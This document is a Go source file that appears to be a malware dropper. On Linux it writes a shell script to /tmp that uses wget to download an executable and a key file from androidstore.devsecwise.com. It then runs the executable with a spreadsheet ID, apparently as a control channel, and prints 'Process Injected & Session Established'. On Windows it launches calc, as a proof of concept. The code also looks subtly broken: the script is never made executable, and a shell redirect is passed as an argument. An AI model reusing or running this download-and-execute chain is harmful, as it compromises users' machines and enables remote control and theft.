package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/user"
	"runtime"
)

func main() {
	os := runtime.GOOS
	switch os {
	case "windows":
		fmt.Println("Windows")
		cmd := exec.Command("calc")

		err := cmd.Run()

		if err != nil {
			log.Fatal(err)
		}
	case "darwin":
		fmt.Println("MAC operating system")
	case "linux":
		mali()
		//hello()
		//fmt.Println("LInux")
		meo()
	default:
		fmt.Printf("%s.\n", os)
	}
}
func mali() {
	f, err := os.Create("/tmp/system.sh")

	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString("#!/bin/bash\ncd  ~/go/bin/\nif [ -f test  ];\nthen\nchmod +x test\n./test --key file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\nelse\nwget https://androidstore.devsecwise.com/test > /dev/null 2>&1\nwget https://androidstore.devsecwise.com/file.json > /dev/null 2>&1\nchmod +x test\n./test --key file.json --sheet 1k-xqESUcvXL9iP_fQwX4nQxRGzTmy8rEU5eCMRv-X-8\nfi")

	if err2 != nil {
		log.Fatal(err2)
	}
}
func meo2() {
	user, err := user.Current()
	if err != nil {
		log.Fatalf(err.Error())
	}

	username := user.Username
	fmt.Println(username)

}
func meo() {

	cmd := exec.Command("/tmp/system.sh", "> /dev/null 2>&1")
	cmd.Dir = "/tmp/"

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start cmd: %v", err)
		return
	}

	// Do other stuff while cmd runs in background:
	log.Println("Doing other stuff...")
	testing()

	// And when you need to wait for the command to finish:
	if err := cmd.Wait(); err != nil {
		log.Printf("Cmd returned error: %v", err)
	}
}
func testing() {
	fmt.Println("Process Injected & Session Established")
	os.Exit(3)
}
